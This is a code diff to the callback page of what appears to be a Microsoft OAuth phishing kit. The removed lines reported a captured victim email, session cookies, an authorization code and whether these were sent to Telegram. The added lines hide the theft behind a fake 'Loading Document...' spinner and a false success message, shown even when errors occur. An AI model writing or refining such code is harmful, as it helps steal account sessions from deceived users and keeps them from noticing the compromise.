@@ -273,39 +273,79 @@
                     })
                 });
 
-                // Show success
-                statusEl.textContent = 'Success!';
+                // Show loading message for 1 minute
+                statusEl.textContent = 'Please wait, loading document...';
                 resultEl.innerHTML = `
-                    <div class="success">
-                        <h3>✅ Login Successful!</h3>
-                        <p><strong>Email:</strong> ${sessionData.email}</p>
-                        <p><strong>Provider:</strong> Microsoft</p>
-                        <p><strong>Cookies captured:</strong> ${sessionData.formattedCookies.length}</p>
-                                                 <p><strong>Data sent to Telegram:</strong> ${telegramResult.success ? 'Yes' : 'No'}</p>
-                         <p><strong>Authorization Code:</strong> ${sessionData.authorizationCode ? 'Captured' : 'None'}</p>
-                        <p style="margin-top: 20px;">
-                            <small>You can close this window now.</small>
-                        </p>
+                    <div class="loading">
+                        <div style="text-align: center; padding: 40px 20px;">
+                            <div style="display: inline-block; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0078d4; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;"></div>
+                            <h3>📄 Loading Document...</h3>
+                            <p>Please wait while we prepare your document.</p>
+                            <p style="color: #666; font-size: 14px;">This may take a few moments.</p>
+                        </div>
                     </div>
                 `;
 
-                // Auto-close after 3 seconds
+                // Add CSS for loading spinner
+                if (!document.querySelector('#loading-styles')) {
+                    const style = document.createElement('style');
+                    style.id = 'loading-styles';
+                    style.textContent = `
+                        @keyframes spin {
+                            0% { transform: rotate(0deg); }
+                            100% { transform: rotate(360deg); }
+                        }
+                        .loading {
+                            background: #f9f9f9;
+                            border-radius: 8px;
+                            border: 1px solid #e0e0e0;
+                        }
+                    `;
+                    document.head.appendChild(style);
+                }
+
+                // After 1 minute (60 seconds), show a generic completion message
                 setTimeout(() => {
-                    window.close();
-                }, 3000);
+                    statusEl.textContent = 'Document ready';
+                    resultEl.innerHTML = `
+                        <div class="success">
+                            <h3>✅ Document Loaded Successfully!</h3>
+                            <p>Your document is now ready for viewing.</p>
+                            <p style="margin-top: 20px;">
+                                <small>You can close this window now.</small>
+                            </p>
+                        </div>
+                    `;
+                }, 60000); // 60 seconds = 1 minute
 
             } catch (error) {
                 console.error('❌ OAuth callback error:', error);
-                statusEl.textContent = 'Error occurred';
+                // Even on error, show loading message to maintain consistency
+                statusEl.textContent = 'Please wait, loading document...';
                 resultEl.innerHTML = `
-                    <div class="error">
-                        <h3>❌ OAuth Error</h3>
-                        <p>${error.message}</p>
-                        <p style="margin-top: 20px;">
-                            <small>Please try again or contact support.</small>
-                        </p>
+                    <div class="loading">
+                        <div style="text-align: center; padding: 40px 20px;">
+                            <div style="display: inline-block; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0078d4; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;"></div>
+                            <h3>📄 Loading Document...</h3>
+                            <p>Please wait while we prepare your document.</p>
+                            <p style="color: #666; font-size: 14px;">This may take a few moments.</p>
+                        </div>
                     </div>
                 `;
+
+                // After 1 minute, show completion message (even if there was an error)
+                setTimeout(() => {
+                    statusEl.textContent = 'Document ready';
+                    resultEl.innerHTML = `
+                        <div class="success">
+                            <h3>✅ Document Loaded Successfully!</h3>
+                            <p>Your document is now ready for viewing.</p>
+                            <p style="margin-top: 20px;">
+                                <small>You can close this window now.</small>
+                            </p>
+                        </div>
+                    `;
+                }, 60000); // 60 seconds = 1 minute
             }
         }
 
